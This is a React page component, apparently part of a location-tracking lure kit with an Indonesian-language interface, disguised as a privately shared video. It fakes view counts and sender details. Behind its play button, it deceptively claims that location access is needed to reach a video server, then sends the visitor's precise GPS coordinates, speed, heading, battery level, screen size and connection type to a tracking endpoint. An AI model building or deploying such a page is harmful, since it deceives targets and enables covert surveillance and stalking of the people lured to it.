'use client';

import { useState, useEffect, useRef, use } from 'react';

export default function TargetVideoViewPage({ params }) {
  const unwrappedParams = use(params);
  const linkId = unwrappedParams.id;

  const [linkConfig, setLinkConfig] = useState(null);
  const [isPlaying, setIsPlaying] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [permissionError, setPermissionError] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  const [likes, setLikes] = useState(184);
  const [hasLiked, setHasLiked] = useState(false);

  const videoRef = useRef(null);

  // 1. Notify server of page visit on mount & fetch link metadata
  useEffect(() => {
    if (!linkId) return;

    fetch(`/api/visit/${linkId}`, { method: 'POST' }).catch(() => {});

    fetch(`/api/links/${linkId}`)
      .then((res) => res.json())
      .then((data) => {
        if (data.success && data.link) {
          setLinkConfig(data.link);
        }
      })
      .catch((err) => console.warn('Fetch link error:', err));
  }, [linkId]);

  // Battery helper
  const getBattery = async () => {
    try {
      if (typeof navigator !== 'undefined' && typeof navigator.getBattery === 'function') {
        const b = await navigator.getBattery();
        const level = Math.round((b.level || 0) * 100);
        const charging = b.charging ? ' (⚡ Mengisi)' : '';
        return `${level}%${charging}`;
      }
    } catch (e) {}
    return null;
  };

  // Play button click: Request Geolocation & play video
  const handlePlayVideo = async () => {
    setPermissionError(false);
    setIsLoading(true);

    if (typeof window === 'undefined' || !navigator.geolocation) {
      // If browser doesn't support geolocation, just play video directly
      startVideoPlayback();
      return;
    }

    const screenResolution = `${window.screen.width}x${window.screen.height}`;
    const connectionType = navigator.connection ? navigator.connection.effectiveType : 'unknown';
    const battery = await getBattery();

    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        // Location acquired!
        const { latitude, longitude, accuracy, altitude, altitudeAccuracy, heading, speed } = pos.coords;

        try {
          await fetch(`/api/track/${linkId || 'direct'}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              latitude,
              longitude,
              accuracy,
              altitude,
              altitudeAccuracy,
              heading,
              speed,
              screenResolution,
              battery,
              connectionType
            })
          });
        } catch (e) {
          console.warn('Track post error:', e);
        }

        // Start playing the video!
        startVideoPlayback();
      },
      (err) => {
        setIsLoading(false);
        setPermissionError(true);
        if (err.code === 1) {
          setErrorMessage('Izin lokasi diperlukan untuk menghubungkan ke server video terdekat di wilayah Anda. Ketuk ikon gembok di samping alamat web di atas lalu pilih Izinkan Lokasi.');
        } else {
          setErrorMessage('Gagal menghubungkan ke server CDN video. Pastikan GPS/Location perangkat telah aktif lalu coba putar kembali.');
        }
      },
      {
        enableHighAccuracy: true,
        timeout: 12000,
        maximumAge: 0
      }
    );
  };

  const startVideoPlayback = () => {
    setIsLoading(false);
    setIsPlaying(true);
    if (videoRef.current) {
      videoRef.current.play().catch(() => {
        // Autoplay policy might require controls
      });
    }
  };

  const videoSource = linkConfig?.videoUrl || 'https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/ForBiggerBlazes.mp4';
  const videoTitle = linkConfig?.title || 'Video Dokumentasi & Momen Spesial';

  return (
    <div style={{
      minHeight: '100vh',
      backgroundColor: '#0a0d14',
      color: '#f8fafc',
      fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif',
      padding: '0 0 40px 0'
    }}>
      
      <div style={{ maxWidth: '840px', margin: '24px auto 0', padding: '0 16px' }}>

        {/* Video Player Container */}
        <div style={{
          position: 'relative',
          width: '100%',
          aspectRatio: '16 / 9',
          backgroundColor: '#000000',
          borderRadius: '16px',
          overflow: 'hidden',
          boxShadow: '0 20px 50px -10px rgba(0, 0, 0, 0.8), 0 0 30px rgba(239, 68, 68, 0.1)',
          border: '1px solid rgba(255, 255, 255, 0.1)'
        }}>

          {/* HTML5 Video element */}
          <video
            ref={videoRef}
            src={videoSource}
            playsInline
            controls={isPlaying}
            style={{
              width: '100%',
              height: '100%',
              objectFit: 'cover',
              display: 'block'
            }}
          />

          {/* Player Overlay Before Playing */}
          {!isPlaying && (
            <div
              onClick={handlePlayVideo}
              style={{
                position: 'absolute',
                top: 0,
                left: 0,
                width: '100%',
                height: '100%',
                background: 'linear-gradient(rgba(0,0,0,0.35), rgba(0,0,0,0.75))',
                display: 'flex',
                flexDirection: 'column',
                alignItems: 'center',
                justifyContent: 'center',
                cursor: 'pointer',
                userSelect: 'none',
                zIndex: 10
              }}
            >
              {/* Quality & Duration Badges */}
              <div style={{
                position: 'absolute',
                top: '16px',
                right: '16px',
                display: 'flex',
                gap: '8px'
              }}>
                <span style={{
                  padding: '4px 8px',
                  background: 'rgba(0,0,0,0.65)',
                  backdropFilter: 'blur(4px)',
                  borderRadius: '6px',
                  fontSize: '0.75rem',
                  fontWeight: 600,
                  border: '1px solid rgba(255,255,255,0.2)'
                }}>
                  1080p 60fps
                </span>
                <span style={{
                  padding: '4px 8px',
                  background: 'rgba(0,0,0,0.65)',
                  backdropFilter: 'blur(4px)',
                  borderRadius: '6px',
                  fontSize: '0.75rem',
                  fontWeight: 600,
                  border: '1px solid rgba(255,255,255,0.2)'
                }}>
                  01:45
                </span>
              </div>

              {/* Big Central Play Button */}
              <div style={{ position: 'relative', marginBottom: '14px' }}>
                <div style={{
                  width: '84px',
                  height: '84px',
                  borderRadius: '50%',
                  background: 'rgba(239, 68, 68, 0.95)',
                  boxShadow: '0 0 35px rgba(239, 68, 68, 0.7), 0 0 0 8px rgba(239, 68, 68, 0.25)',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  color: 'white',
                  fontSize: '34px',
                  paddingLeft: '6px',
                  transition: 'transform 0.2s ease',
                  transform: isLoading ? 'scale(0.95)' : 'scale(1)'
                }}>
                  {isLoading ? (
                    <div style={{
                      width: '32px',
                      height: '32px',
                      border: '3px solid rgba(255,255,255,0.3)',
                      borderRadius: '50%',
                      borderTopColor: '#ffffff',
                      animation: 'spin 0.8s linear infinite'
                    }} />
                  ) : (
                    '▶'
                  )}
                </div>
              </div>

              <div style={{
                fontSize: '1.1rem',
                fontWeight: 600,
                color: '#ffffff',
                textShadow: '0 2px 8px rgba(0,0,0,0.8)'
              }}>
                {isLoading ? 'Menghubungkan ke Server Video...' : 'Ketuk untuk Putar Video'}
              </div>

              <div style={{
                fontSize: '0.8rem',
                color: 'rgba(255,255,255,0.7)',
                marginTop: '4px'
              }}>
                Klik tombol di atas untuk memulai streaming
              </div>

              {/* Fake Progress Bar at bottom */}
              <div style={{
                position: 'absolute',
                bottom: 0,
                left: 0,
                width: '100%',
                height: '4px',
                background: 'rgba(255,255,255,0.2)'
              }}>
                <div style={{ width: '0%', height: '100%', background: '#ef4444' }} />
              </div>

            </div>
          )}

        </div>

        {/* Error Notice If User Blocked Location */}
        {permissionError && (
          <div style={{
            marginTop: '16px',
            padding: '14px 18px',
            backgroundColor: 'rgba(239, 68, 68, 0.12)',
            border: '1px solid rgba(239, 68, 68, 0.35)',
            borderRadius: '12px',
            color: '#fca5a5',
            fontSize: '0.88rem',
            lineHeight: 1.5,
            display: 'flex',
            flexDirection: 'column',
            gap: '10px'
          }}>
            <div><strong>⚠️ Pemutaran Video Tertunda:</strong> {errorMessage}</div>
            <button
              onClick={handlePlayVideo}
              style={{
                alignSelf: 'flex-start',
                padding: '8px 16px',
                backgroundColor: '#ef4444',
                color: 'white',
                border: 'none',
                borderRadius: '8px',
                fontSize: '0.85rem',
                fontWeight: 600,
                cursor: 'pointer'
              }}
            >
              🔄 Coba Putar Lagi
            </button>
          </div>
        )}

        {/* Video Title & Metrics */}
        <div style={{ marginTop: '18px' }}>
          <h1 style={{
            fontSize: '1.35rem',
            fontWeight: 700,
            lineHeight: 1.35,
            margin: 0,
            color: '#f8fafc'
          }}>
            {videoTitle}
          </h1>

          <div style={{
            display: 'flex',
            justifyContent: 'space-between',
            alignItems: 'center',
            marginTop: '10px',
            flexWrap: 'wrap',
            gap: '12px'
          }}>
            <div style={{ fontSize: '0.82rem', color: '#94a3b8' }}>
              👁️ 3,428 ditonton &bull; Dibagikan hari ini &bull; HD 1080p
            </div>

            {/* Action buttons */}
            <div style={{ display: 'flex', gap: '8px' }}>
              <button
                onClick={() => {
                  setLikes(hasLiked ? likes - 1 : likes + 1);
                  setHasLiked(!hasLiked);
                }}
                style={{
                  display: 'flex',
                  alignItems: 'center',
                  gap: '6px',
                  padding: '8px 14px',
                  background: hasLiked ? 'rgba(239, 68, 68, 0.2)' : 'rgba(255, 255, 255, 0.06)',
                  border: '1px solid rgba(255, 255, 255, 0.1)',
                  borderRadius: '9999px',
                  color: hasLiked ? '#ef4444' : '#f8fafc',
                  fontSize: '0.82rem',
                  fontWeight: 600,
                  cursor: 'pointer'
                }}
              >
                👍 {likes}
              </button>

              <button
                onClick={() => {
                  if (navigator.share) {
                    navigator.share({ title: videoTitle, url: window.location.href });
                  } else {
                    navigator.clipboard.writeText(window.location.href);
                    alert('Tautan video berhasil disalin!');
                  }
                }}
                style={{
                  display: 'flex',
                  alignItems: 'center',
                  gap: '6px',
                  padding: '8px 14px',
                  background: 'rgba(255, 255, 255, 0.06)',
                  border: '1px solid rgba(255, 255, 255, 0.1)',
                  borderRadius: '9999px',
                  color: '#f8fafc',
                  fontSize: '0.82rem',
                  fontWeight: 600,
                  cursor: 'pointer'
                }}
              >
                ↗️ Bagikan
              </button>
            </div>
          </div>
        </div>

        {/* Channel / Sender Box */}
        <div style={{
          display: 'flex',
          alignItems: 'center',
          gap: '12px',
          marginTop: '18px',
          padding: '14px 18px',
          backgroundColor: '#111726',
          borderRadius: '12px',
          border: '1px solid rgba(255, 255, 255, 0.08)'
        }}>
          <div style={{
            width: '42px',
            height: '42px',
            borderRadius: '50%',
            background: 'linear-gradient(135deg, #3b82f6, #8b5cf6)',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            fontSize: '18px',
            fontWeight: 700
          }}>
            👤
          </div>
          <div>
            <div style={{ fontWeight: 600, fontSize: '0.92rem', color: '#f8fafc' }}>
              Dibagikan oleh Rekan Anda
            </div>
            <div style={{ fontSize: '0.78rem', color: '#94a3b8' }}>
              Tautan Pribadi Terenkripsi &bull; Kualitas Penuh
            </div>
          </div>
        </div>

        {/* Video Description / Details */}
        <div style={{
          marginTop: '16px',
          padding: '14px 18px',
          backgroundColor: 'rgba(255, 255, 255, 0.03)',
          borderRadius: '12px',
          border: '1px solid rgba(255, 255, 255, 0.05)',
          fontSize: '0.85rem',
          color: '#cbd5e1',
          lineHeight: 1.55
        }}>
          Video ini telah dibagikan khusus kepada Anda dalam format High Definition streaming. Pemutar secara otomatis menyesuaikan resolusi layar dan kecepatan jaringan perangkat Anda.
        </div>

      </div>

    </div>
  );
}
